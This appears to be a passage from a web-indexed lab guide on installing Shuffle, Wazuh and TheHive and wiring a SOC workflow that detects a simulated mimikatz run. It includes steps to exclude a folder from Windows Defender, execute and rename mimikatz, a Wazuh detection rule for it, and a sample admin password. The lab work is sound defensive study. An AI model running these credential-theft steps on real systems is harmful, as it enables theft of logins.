Shuffle, Wazuh, and TheHive. An attack simulation was conducted on the Windows and Ubuntu hosts in a safe and controlled environment.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) shuffle Ubuntu 22.04 LTS Shuffle (SOAR) 10.0.0.28 WazuhServer Centos Stream 9 Wazuh server (SIEM server) 10.0.0.20 hive Ubuntu 22.04 LTS TheHive (IR) 10.0.0.40 WS2019 Windows Server 2019 Wazuh agent (SIEM client) 10.0.0.24 SyslogUbuntu Ubuntu 22.04 LTS Wazuh agent, rsyslog server 10.0.0.26 Kali Kali Linux 2024.2 Attacker machine 192.168.1.161, 10.0.0.29 <p></p>"},{"location":"shuffle/shuffle.html#install-shuffle-online","title":"Install Shuffle online","text":""},{"location":"shuffle/shuffle.html#install-docker-using-the-apt-repository-ubuntu","title":"Install Docker using the apt repository (Ubuntu)","text":"<p>Before you install Docker Engine for the first time on a new host machine, you need to set up the Docker repository. Afterward, you can install and update Docker from the repository.</p> <p>Set up Docker's apt repository.</p> <pre><code># Add Docker's official GPG key:\nsudo apt-get update\nsudo apt-get install ca-certificates curl\nsudo install -m 0755 -d /etc/apt/keyrings\nsudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc\nsudo chmod a+r /etc/apt/keyrings/docker.asc\n\n# Add the repository to Apt sources:\necho \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\\n  $(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\\n  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null\nsudo apt-get update\n</code></pre> <p>Install the Docker packages.</p> <pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin\n</code></pre> <p>Verify that the Docker Engine installation is successful by running the\u00a0<code>hello-world</code>\u00a0image.</p> <pre><code>sudo docker run hello-world\n</code></pre>"},{"location":"shuffle/shuffle.html#install-docker-engine-manually-ubuntu","title":"Install Docker Engine manually (Ubuntu)","text":"<p>All the required deb files for Docker Engine have been downloaded and put together in the folder called docker. For your reference, the steps for downloading the required deb files for Docker Engine are documented below.</p> <p>On Ubuntu host with internet connection:</p> <p>Option 1</p> <p>Run the following command:</p> <pre><code>curl -L https://get.docker.com | sh\n</code></pre> <p>Option 2</p> <p>You will need to download a new file each time you want to upgrade Docker Engine. Select your Ubuntu version in the list.</p> <p>Go to\u00a0<code>pool/stable/</code>\u00a0and select the applicable architecture (<code>amd64</code>,\u00a0<code>armhf</code>,\u00a0<code>arm64</code>, or\u00a0<code>s390x</code>).</p> <p>Download the following\u00a0<code>deb</code>\u00a0files for the Docker Engine, CLI, containerd, and Docker Compose packages:</p> <ul> <li><code>containerd.io_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-ce_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li> <li><code>docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.deb</code></li> </ul> <p>Install the\u00a0<code>.deb</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>cd docker\nsudo dpkg -i *\n</code></pre> <p>Run <code>sudo service docker start</code></p>"},{"location":"shuffle/shuffle.html#install-docker-engine-manually-centos","title":"Install Docker Engine manually (CentOS)","text":"<p>All the required deb files for Docker Engine have been downloaded and put together in the folder called docker. For your reference, the steps for downloading the required deb files for Docker Engine are documented below.</p> <p>On CentOS host with internet connection:</p> <p>If you can't use Docker's rpm repository to install Docker Engine, you can download the .rpm file for your release and install it manually. You need to download a new file each time you want to upgrade Docker Engine.</p> <p>Go to https://download.docker.com/linux/centos/ and choose your version of CentOS. Then browse to x86_64/stable/Packages/ and download the .rpm file for the Docker version you want to install.</p> <p>Go to\u00a0<code>pool/stable/</code>\u00a0and select the applicable architecture (<code>amd64</code>,\u00a0<code>armhf</code>,\u00a0<code>arm64</code>, or\u00a0<code>s390x</code>).</p> <p>Download the following\u00a0rpm\u00a0files for the Docker Engine, CLI, containerd, and Docker Compose packages:</p> <ul> <li><code>containerd.io_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-ce_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-ce-cli_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-buildx-plugin_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> <li><code>docker-compose-plugin_&lt;version&gt;_&lt;arch&gt;.rpm</code></li> </ul> <p>Install the\u00a0<code>.rpm</code>\u00a0packages. Change directory into the docker folder and run:</p> <pre><code>cd docker\nsudo yum install *\n</code></pre> <p>Start the docker</p> <pre><code>sudo service docker start\n</code></pre>"},{"location":"shuffle/shuffle.html#download-shuffle-github-repository","title":"Download Shuffle GitHub Repository","text":"<p>Clone or download the Shuffle repository as a zip archive from the Shuffle GitHub page. If git command cannot be installed, download the zip.</p> <pre><code>sudo apt install git\ncd /opt\nsudo git clone https://github.com/Shuffle/Shuffle\ncd Shuffle\n</code></pre> <p></p> <p>If Shuffle-main.zip is downloaded, unzip  to the /opt directory </p> <pre><code>sudo unzip Shuffle-main.zip -d /opt\nsudo unzip python-apps-master.zip -d /opt/Shuffle-main/shuffle-apps\n</code></pre> <p>Change into /opt/Shuffle directory</p> <p>Fix prerequisites for the Opensearch database (Elasticsearch):</p> <pre><code>cd /opt/Shuffle-main\nmkdir shuffle-database                    # Create a database folder\nsudo chown -R 1000:1000 shuffle-database  # IF you get an error using 'chown', add the user first with 'sudo useradd opensearch'\n\nsudo swapoff -a                           # Disable swap\n</code></pre> <p>Run docker-compose.</p> <pre><code>cd \ndocker compose up -d\n</code></pre> <p>Recommended for Opensearch to work well</p> <pre><code>sudo sysctl -w vm.max_map_count=262144             \n# https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html\n</code></pre>"},{"location":"shuffle/shuffle.html#install-shuffle-offline","title":"Install Shuffle offline","text":"<p>This procedure will help you export what you need to run Shuffle on a no internet host.</p>"},{"location":"shuffle/shuffle.html#pre-requisite","title":"Pre-requisite","text":"<ul> <li>Both machines has Docker and Docker Compose installed already</li> <li>Your host machine already needs the images on it to make them exportable</li> </ul>"},{"location":"shuffle/shuffle.html#pull-images-on-original-machine","title":"Pull images on original machine","text":"<p>Shuffle need a few base images to work:</p> <ul> <li>shuffle-frontend</li> <li>shuffle-backend</li> <li>shuffle-orborus</li> <li>shuffle-worker</li> <li>shuffle:app_sdk</li> <li>opensearch</li> <li>shuffle-subflow</li> </ul> <pre><code>docker pull ghcr.io/shuffle/shuffle-backend\ndocker pull ghcr.io/shuffle/shuffle-frontend \ndocker pull ghcr.io/shuffle/shuffle-orborus\ndocker pull ghcr.io/shuffle/shuffle-app_sdk:latest\ndocker pull ghcr.io/shuffle/shuffle-worker:latest\ndocker pull opensearchproject/opensearch:2.14.0\ndocker pull frikky/shuffle-subflow\ndocker pull frikky/shuffle:shuffle-tools_1.2.0\ndocker pull frikky/shuffle:wazuh_1.0.0\ndocker pull frikky/shuffle:thehive_1.1.3\n</code></pre> <p>Be careful with the versioning for opensearch, all other are going to use the tag \"latest\". You will also need to download and transfer ALL the apps you want to use. These can be discovered as such:</p> <pre><code>docker images | grep -i shuffle\n</code></pre> <p>Save images and archive them</p> <pre><code>mkdir shuffle-export\ncd shuffle-export\n\ndocker save ghcr.io/shuffle/shuffle-backend:latest &gt; backend.tar\ndocker save ghcr.io/shuffle/shuffle-frontend:latest &gt; frontend.tar\ndocker save ghcr.io/shuffle/shuffle-orborus:latest &gt; orborus.tar\ndocker save ghcr.io/shuffle/shuffle-app_sdk:latest &gt; app_sdk.tar\n##docker save frikky/shuffle:app_sdk &gt; app_sdk.tar\n##docker save ghcr.io/frikky/shuffle-worker:latest &gt; worker.tar\ndocker save ghcr.io/shuffle/shuffle-worker:latest &gt; worker.tar\ndocker save opensearchproject/opensearch:2.14.0 &gt; opensearch.tar\ndocker save frikky/shuffle-subflow:latest &gt; sublow.tar\ndocker save frikky/shuffle:shuffle-tools_1.2.0 &gt; shuffle-tools.tar\ndocker save frikky/shuffle:wazuh_1.0.0 &gt; wazuh.tar\ndocker save frikky/shuffle:thehive_1.1.3 &gt; thehive.tar\n\ngit clone https://github.com/Shuffle/python-apps.git\n\nwget https://raw.githubusercontent.com/Shuffle/Shuffle/master/.env\nwget https://raw.githubusercontent.com/Shuffle/Shuffle/master/docker-compose.yml\n\ncd .. \ntar cvf shuffle-export.tar.gz shuffle-export\n</code></pre> <p>Export shuffle-export.tar.gz to the host without internet connection</p> <p>Import docker images to host without internet</p> <pre><code>tar xvf shuffle-export.tar.gz -C /opt\ncd /opt/shuffle-export\nfind -type f -name \"*.tar\" -exec docker load --input \"{}\" \\;\n</code></pre> <p>Create folders to add the python apps</p> <pre><code>mkdir shuffle-apps\ncp -r python-apps/* shuffle-apps/\n</code></pre> <p>Create a folder called shuffle-database and change the ownership.</p> <p>If you get an error using 'chown', add the user first with 'sudo useradd opensearch'</p> <p>Disable swap</p> <p>Set the <code>vm.max_map_count</code> kernel parameter to 262144. This is often needed for applications like Elasticsearch or Opensearch that require a higher limit for the number of virtual memory areas a process can have.</p> <pre><code>mkdir shuffle-database  \nsudo chown -R 1000:1000 shuffle-database  \nsudo swapoff -a                          \nsudo sysctl -w vm.max_map_count=262144\n</code></pre> <p>Run <code>docker images</code> </p> <p>Edit the image names in docker-compose.yml to align it with the output from <code>docker images</code></p> <pre><code>docker images\nREPOSITORY                               TAG                     IMAGE ID       CREATED         SIZE\nregistry.hub.docker.com/frikky/shuffle   shuffle-subflow_1.0.0   5ed48be6f649   33 hours ago    293MB\nfrikky/shuffle                           app_sdk                 1dde46cd09da   10 days ago     291MB\nghcr.io/frikky/shuffle-worker            latest                  adb137fa1718   15 months ago   44.4MB\nopensearchproject/opensearch             2.5.0                   5a030d679ac7   18 months ago   1.17GB\nghcr.io/frikky/shuffle-backend           latest                  2e3d97ae8e30   21 months ago   57.9MB\nghcr.io/frikky/shuffle-frontend          latest                  be49fe2395d3   21 months ago   191MB\nghcr.io/frikky/shuffle-orborus           latest                  068b942b0302   21 months ago   29.9MB\n</code></pre> <pre><code>services:\n  frontend:\n    image: ghcr.io/frikky/shuffle-frontend:latest\n\n  backend:\n    image: ghcr.io/frikky/shuffle-backend:latest\n\n  orborus:\n    image: ghcr.io/frikky/shuffle-orborus:latest\n\n  opensearch:\n    image: opensearchproject/opensearch:2.5.0 \n</code></pre> <p>Run docker-compose.</p> <pre><code>docker compose up -d\n</code></pre>"},{"location":"shuffle/shuffle.html#troubleshooting","title":"Troubleshooting","text":"<p>Verify that there are no major errors in the logs and all containers are up and running </p> <p>Check docker processes</p> <pre><code>docker ps \n\nCONTAINER ID   IMAGE                                    COMMAND                  CREATED         STATUS         PORTS                                                                                NAMES\n6304c903bdde   ghcr.io/frikky/shuffle-frontend:latest   \"/entrypoint.sh ngin\u2026\"   3 minutes ago   Up 3 minutes   0.0.0.0:3001-&gt;80/tcp, [::]:3001-&gt;80/tcp, 0.0.0.0:3443-&gt;443/tcp, [::]:3443-&gt;443/tcp   shuffle-frontend\n899ab92ccdd5   ghcr.io/frikky/shuffle-backend:latest    \"./webapp\"               3 minutes ago   Up 3 minutes   0.0.0.0:5001-&gt;5001/tcp, :::5001-&gt;5001/tcp                                            shuffle-backend\ncccd0236ead3   ghcr.io/frikky/shuffle-orborus:latest    \"./orborus\"              3 minutes ago   Up 3 minutes                                                                                        shuffle-orborus\nfaa724f843ad   opensearchproject/opensearch:2.5.0       \"./opensearch-docker\u2026\"   3 minutes ago   Up 3 minutes   9300/tcp, 9600/tcp, 0.0.0.0:9200-&gt;9200/tcp, :::9200-&gt;9200/tcp, 9650/tcp              shuffle-opensearch\n</code></pre> <p>Check docker container logs</p> <pre><code>docker logs shuffle-backend\ndocker logs shuffle-frontend\ndocker logs shuffle-orborus\ndocker logs shuffle-opensearch\n</code></pre> <p>Check loaded docker images</p> <pre><code>root@shuffleoffline:/opt/shuffle-exp# docker images\nREPOSITORY                               TAG                                        IMAGE ID       CREATED        SIZE\nfrikky/shuffle                           TheHive-244ac27f71490576f2152f1a478763dd   04651821b9a9   11 hours ago   292MB\nfrikky/shuffle                           thehive_1.1.0                              04651821b9a9   11 hours ago   292MB\nfrikky/shuffle                           Wazuh-2f5945bb5a582a6b676ba7c212412cdb     c6e36c51b505   11 hours ago   292MB\nfrikky/shuffle                           wazuh_1.1.0                                c6e36c51b505   11 hours ago   292MB\n&lt;none&gt;                                   &lt;none&gt;                                     15951f6d8452   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     b99fc014293d   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     5e2ccf369d65   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     dafc616bc131   25 hours ago   291MB\n&lt;none&gt;                                   &lt;none&gt;                                     71fa350d234f   25 hours ago   291MB\nfrikky/shuffle                           shuffle-tools_1.2.0                        4159398549c0   3 days ago     387MB\nfrikky/shuffle                           shuffle-tools_1.1.0                        5712b5ea194b   3 days ago     362MB\nregistry.hub.docker.com/frikky/shuffle   shuffle-tools_1.1.0                        5712b5ea194b   3 days ago     362MB\nfrikky/shuffle-subflow                   latest                                     5ed48be6f649   3 days ago     293MB\nfrikky/shuffle                           thehive_1.1.3                              9b1209a0ba38   3 days ago     297MB\nfrikky/shuffle                           app_sdk                                    1dde46cd09da   12 days ago    291MB\nghcr.io/shuffle/shuffle-frontend         latest                                     30c4090d085c   3 weeks ago    196MB\nghcr.io/shuffle/shuffle-worker           latest                                     9f7c39d5fb1e   3 weeks ago    79MB\nghcr.io/shuffle/shuffle-backend          latest                                     59613e03c036   3 weeks ago    93.4MB\nghcr.io/shuffle/shuffle-app_sdk          latest                                     3ac4837de611   3 weeks ago    291MB\nopensearchproject/opensearch             2.14.0                                     bf1e1cd1fa30   2 months ago   1.33GB\nghcr.io/shuffle/shuffle-orborus          latest                                     7457cc8b6210   3 months ago   67.7MB\nfrikky/shuffle                           wazuh_1.0.0                                8a72f12273c6   3 years ago    66MB\n</code></pre> <p>If the orborus logs shows that it is trying to pull the images from the internet, tag your locally loaded images by running docker tag  </p> <pre><code>docker logs shuffle-orborus\n...\n2024/09/07 23:36:59 [DEBUG] Pulling image ghcr.io/shuffle/shuffle-app_sdk:latest\n2024/09/07 23:37:39 [ERROR] Failed getting image ghcr.io/shuffle/shuffle-app_sdk:latest: Error response from daemon: Get \"https://ghcr.io/v2/\": dial tcp: lookup ghcr.io on 127.0.0.53:53: read udp 127.0.0.1:58367-&gt;127.0.0.53:53: i/o timeout\n</code></pre> <pre><code>docker tag 3ac4837de611 ghcr.io/shuffle/shuffle-app_sdk:latest\n</code></pre> <p>If you are using older version of opensearch (&lt; 2.14.0), you may encounter authentication issues as shown by the opensearch logs:</p> <pre><code>docker logs shuffle-opensearch\n...\nAuthentication finally failed for admin from 172.18.0.4:51382\n</code></pre> <p>If this is the case, access the opensearch, navigate to /config/opensearch-security and edit the configuration file:</p> <pre><code>docker exec -it shuffle-opensearch /bin/bash\n[opensearch@shuffle-opensearch config]$ cd config/opensearch-security/\n</code></pre> <pre><code>[opensearch@shuffle-opensearch opensearch-security]$ cat internal_users.yml \n---\n# This is the internal user database\n# The hash value is a bcrypt hash and can be generated with plugin/tools/hash.sh\n\n_meta:\n  type: \"internalusers\"\n  config_version: 2\n\n# Define your internal users here\n\n## Demo users\n\nadmin:\n  hash: \"$2a$12$VcCDgh2NDk07JGN0rjGbM.Ad41qVR/YFJcgHp0UGns5JDymv..TOG\"\n  reserved: true\n  backend_roles:\n  - \"admin\"\n  description: \"Demo admin user\"\n</code></pre> <p>There admin hash does not match with admin password defined in .env file</p> <pre><code># DATABASE CONFIGURATIONS\n...\nSHUFFLE_OPENSEARCH_USERNAME=\"admin\"\nSHUFFLE_OPENSEARCH_PASSWORD=\"StrongShufflePassword321!\"\n</code></pre> <p>The bcrypt hash for the password should be:</p> <pre><code>#htpasswd -bnBC 12 \"\" StrongShufflePassword321!\n$2y$12$5juqU2/ybhsBB4H928meCO4ZHtzTFSfDRO87AlAF43fhZOWgDlX1W\n</code></pre> <p>Replace the current hash for the <code>admin</code> user in the <code>internal_users.yml</code> file with the newly generated hash.  After editing the <code>internal_users.yml</code>, apply the changes to OpenSearch by running the <code>securityadmin_demo.sh</code> script inside the OpenSearch container:</p> <pre><code>[opensearch@shuffle-opensearch opensearch-security]$ vi internal_users.yml\n# \"i\" for insert, copy and paste theh hash, \"Esc\" then \":wq\" \n[opensearch@shuffle-opensearch opensearch-security]$ cd ../../\n[opensearch@shuffle-opensearch ~]$ pwd\n/usr/share/opensearch\n[opensearch@shuffle-opensearch ~]$ ./securityadmin_demo.sh \n[opensearch@shuffle-opensearch ~]$ exit\n</code></pre> <p>Change the file permission for *.pem in <code>/usr/share/opensearch/config</code> </p> <pre><code>cd /usr/share/opensearch/config\nchmod 0600 *.pem\n</code></pre> <p>Restart the shuffle-opensearch and shuffle-backend container </p> <pre><code>docker restart shuffle-opensearch\ndocker restart shuffle-backend\n</code></pre>"},{"location":"shuffle/shuffle.html#pull-and-save-docker-images","title":"Pull and Save Docker images","text":"<p>All the required Docker images have been pulled as saved as shuffle_images.tar. For your reference, the steps for pulling and saving the required Docker images are documented below.</p> <p>For this step, we are preparing images from a Ubuntu host with internet connection and Docker installed. The prepared images will then be transferred to the air-gapped environment.</p> <p>On Ubuntu host with internet connection and Docker Engine installed:</p> <p>Open <code>docker-compose.yml</code> file from Shuffle GitHub to identify the images you need.  Look for the <code>image</code> key under each service.</p> <pre><code>services:\n  frontend:\n    image: ghcr.io/shuffle/shuffle-frontend:latest\n  backend:\n    image:ghcr.io/shuffle/shuffle-backend:latest\n  orborus:\n    image: ghcr.io/shuffle/shuffle-orborus:latest\n    ghcr.io/shuffle/shuffle-app_sdk:latest\n    ghcr.io/shuffle/shuffle-worker:latest\n  opensearch:\n    image: opensearchproject/opensearch:2.14.0\n</code></pre> <p>Pull the Images using <code>docker pull:</code></p> <pre><code>docker pull ghcr.io/shuffle/shuffle-frontend:latest\ndocker pull ghcr.io/shuffle/shuffle-backend:latest\ndocker pull ghcr.io/shuffle/shuffle-orborus:latest\ndocker pull opensearchproject/opensearch:2.14.0\ndocker pull ghcr.io/shuffle/shuffle-app_sdk:latest\ndocker pull ghcr.io/shuffle/shuffle-worker:latest\n</code></pre> <p>Verify the Images are pulled by running <code>docker images</code></p> <p>Save the docker images for a transfer to an air-gapped environment</p> <pre><code>docker save -o shuffle_images.tar ghcr.io/shuffle/shuffle-frontend:latest ghcr.io/shuffle/shuffle-backend:latest ghcr.io/shuffle/shuffle-orborus:latest opensearchproject/opensearch:2.14.0 ghcr.io/shuffle/shuffle-app_sdk:latest ghcr.io/shuffle/shuffle-worker:latest\n</code></pre>"},{"location":"shuffle/shuffle.html#download-github-repositories-as-a-zip-archives","title":"Download GitHub repositories as a zip archives","text":"<p>All the required GitHub repositories are downloaded as Shuffle-main.zip and python-apps-master.zip. For your reference, the steps for downloading the required GitHub repositories are documented below. </p> <p>On Ubuntu host with internet connection and Docker installed:</p> <p>Download two repositories as zip archives from the Shuffle GitHub and Shuffle Python Apps GitHub page.</p> <p></p> <p></p> <p>Transfer the docker folder, shuffle_images.tar, Shuffle.zip and python-apps.zip to the Ubuntu host without internet connection. </p> <p>Repeat the steps above to install Docker Engine. </p> <p>Load the Docker images:</p> <pre><code>sudo docker load -i shuffle_images.tar\n</code></pre> <p>Unzip Shuffle.zip to the /opt directory and python-apps.zip to the /opt/Shuffle-main/shuffle-apps directory</p> <pre><code>sudo unzip Shuffle-main.zip -d /opt\nsudo unzip python-apps.zip -d /opt/Shuffle/shuffle-apps\n</code></pre> <p>Change into /opt/Shuffle-main directory</p> <p>Create \u201cshuffle-database\u201d folder</p> <p>Run prerequisites for the Opensearch database (Elasticsearch):</p> <pre><code>cd /opt/Shuffle\nsudo mkdir shuffle-database\n# IF you get an error using 'chown', add the user first with 'sudo useradd opensearch'                    \nsudo chown -R 1000:1000 shuffle-database  \n# Disable swap\nsudo swapoff -a                          \n</code></pre> <p>In the /opt/Shuffle-main folder, run docker-compose.</p> <pre><code>sudo docker compose up -d\n</code></pre> <p>Recommended for Opensearch to work well</p> <pre><code>sudo sysctl -w vm.max_map_count=262144             \n# https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html\n</code></pre>"},{"location":"shuffle/shuffle.html#creating-automated-workflows","title":"Creating Automated Workflows","text":""},{"location":"shuffle/shuffle.html#workflow-zero","title":"Workflow Zero","text":"<p>After installation, go to\u00a0http://(IP address):3001</p> <p>Create administrator account.</p> <p>Sign in with the same Username and Password. </p> <p></p> <p>Select New to Shuffle</p> <p></p> <p>Click Apps</p> <p>Verify there are activated apps</p> <p>If there are issues with loading the apps, click refresh or download from GitHub (internet required) </p> <p></p> <p>Create a new workflow on Shuffle titled \u201cWazuh integration test.\u201d</p> <p></p> <p></p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p></p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: <code>http://10.0.0.27:3001/api/v1/hooks/webhook_d5c7de34-7dcd-4360-994f-4a134cde3d67</code></p> <p></p>"},{"location":"shuffle/shuffle.html#wazuh-server","title":"Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py from the Shuffle GitHub page. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory of Wazuh manager.</p> <pre><code>[root@Centos integrations]# ls\n**custom-shuffle  custom-shuffle.py**  maltiverse  maltiverse.py  pagerduty  pagerduty.py  shuffle  shuffle.py  slack  slack.py  virustotal  virustotal.py\n</code></pre> <p>The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group. The commands below assign permissions and ownership to the\u00a0<code>/var/ossec/integrations/custom-script</code>\u00a0script.</p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy the content from ossec.conf from the Shuffle GitHub page.</p> <pre><code>&lt;integration&gt;\n  &lt;name&gt;custom-shuffle&lt;/name&gt;\n  &lt;level&gt;9&lt;/level&gt;\n  &lt;hook_url&gt;http://&lt;IP&gt;:&lt;PORT&gt;/api/v1/hooks/webhook_hookid&lt;/hook_url&gt;\n  &lt;alert_format&gt;json&lt;/alert_format&gt;\n&lt;/integration&gt;\n</code></pre> <p>Paste it into /var/ossec/etc/ossec.conf and edit it</p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;level&gt;3&lt;/level&gt;\n      &lt;hook_url&gt;http://10.0.0.27:3001/api/v1/hooks/webhook_d5c7de34-7dcd-4360-994f-4a134cde3d67&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Where:</p> <ul> <li><code>&lt;name&gt;</code>: This is the name of the integration and must match with your custom-shuffle downloaded from GitHub.</li> <li><code>&lt;hook_url&gt;</code>: This is the webhook URI copied from the Shuffle webhook. Note: <code>https://</code> can be used but it is not recommended as it causes a certificate mismatch error with the author\u2019s self-signed certificate.</li> <li><code>&lt;level&gt;</code>: This is used to forward a specific alert level.</li> <li><code>&lt;alert_format&gt;</code>: This forwards alerts to Shuffle in JSON format.</li> </ul> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#shuffle_1","title":"Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>Click on the\u00a0show executions\u00a0button.</p> <p></p> <p>Select any execution and expand it for details. You should see a Wazuh alert in the output.</p> <p></p> <p>Note: You may need to wait for a duration of time for Wazuh alerts to appear in Shuffle. This is dependent on the number of events generated in your environment. To manually trigger alerts, restart the Wazuh manager service on the Wazuh server.</p> <p>This shows that Wazuh is sending alerts to Shuffle and the integration is successful. </p>"},{"location":"shuffle/shuffle.html#workflow-one","title":"Workflow One","text":""},{"location":"shuffle/shuffle.html#configure-wazuh","title":"Configure Wazuh","text":""},{"location":"shuffle/shuffle.html#configure-wazuh-windows-client","title":"Configure Wazuh Windows Client","text":"<p>Add Administrator\u2019s Download folder to exclusion in the Windows Security setting.</p> <p></p> <p>Download and transfer mimikatz.exe. Mimikatz is a tool that can steal passwords and other login information from a Windows computer's memory, often used by attackers or penetration testers to gain access to more secure areas of the system.</p> <p>Open PowerShell as Administrator. Execute mimikatz.exe</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-manager","title":"Configure Wazuh Manager","text":"<p>On Wazuh Manager, verify that there are entries related to Mimikatz in the archives file</p> <pre><code>cat /var/ossec/logs/archives/archives.json | grep -i mimikatz\n</code></pre> <p>Verify that searching for \u201cmimikatz.exe\u201d in wazuh-archive-* index returns a result</p> <p></p> <p>Add a custom rule in /var/ossec/etc/rules/local_rules.xml</p> <p>Make sure indentation aligns with other rules</p> <p><code>nano /var/ossec/etc/rules/local_rules.xml</code></p> <pre><code>&lt;rule id=\"100200\" level=\"15\"&gt;\n  &lt;if_group&gt;sysmon_event1&lt;/if_group&gt;\n  &lt;field name=\"win.eventdata.originalFileName\" type=\"pcre2\"&gt;(?i)mimikatz&lt;/field&gt;\n  &lt;description&gt;Mimikatz Usage Detected&lt;/description&gt;\n  &lt;mitre&gt;\n    &lt;id&gt;T1003&lt;/id&gt;\n  &lt;/mitre&gt;\n&lt;/rule&gt;\n</code></pre> <p></p> <p>Restart Wazuh Manager</p> <pre><code>systemctl restart wazuh-manager\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-windows-client","title":"Configure Windows Client","text":"<p>Rename mimikatz.exe to something else (e.g. justanexe)</p> <p></p> <p>Open PowerShell as Administrator and execute mimikatz (justanexe)</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-manager_1","title":"Configure Wazuh Manager","text":"<p>On Wazuh Manager, verify that there are entries related to ruld id 10020 Mimikatz Usage Detected</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-shuffle","title":"Configure Shuffle","text":""},{"location":"shuffle/shuffle.html#upload-the-required-apps","title":"Upload the required Apps","text":"<p>On a machine with internet connection:</p> <p>Search for Wazuh, TheHive and VirusTotal in https://shuffler.io/search</p> <p>Download the OpenAPIs (JSON file)</p> <p></p> <p></p> <p></p> <p>Transfer the JSON files to the air-gapped environement.</p> <p>Navigate to Shuffle web UI and into Apps.</p> <p>Select Generate from Open API</p> <p></p> <p>Upload the Wazuh JSON file</p> <p></p> <p>Scroll to the bottom and click save.</p> <p></p> <p>Repeat the same proccess for TheHive</p> <p></p> <p>Verify that Wazuh, TheHive and Virustotal appear in the Activated Apps </p> <p></p> <p>To ensure that the new app is recognized by Shuffle, restart the Shuffle backend and frontend containers:</p> <pre><code>docker restart shuffle-backend\ndocker restart shuffle-frontend\n</code></pre>"},{"location":"shuffle/shuffle.html#create-a-workflow","title":"Create a Workflow","text":"<p>Repeat the steps covered in Introduction to Shuffle.</p> <p>Create a new workflow called SOC Automation Example. </p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: </p> <p><code>http://10.0.0.28:3001/api/v1/hooks/webhook_6f32bbd0-9ca9-498c-9abe-c55b1f573d09</code></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-server","title":"Configure Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory. The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group: </p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy and paste the following into /var/ossec/etc/ossec.conf</p> <p>This is the rule id for Mimikatz Usage Detected that we defined in the Wazuh Manager</p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;rule_id&gt;100200&lt;/rule_id&gt;\n      &lt;hook_url&gt;http://10.0.0.28:3001/api/v1/hooks/webhook_6f32bbd0-9ca9-498c-9abe-c55b1f573d09&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-shuffle_1","title":"Configure Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it 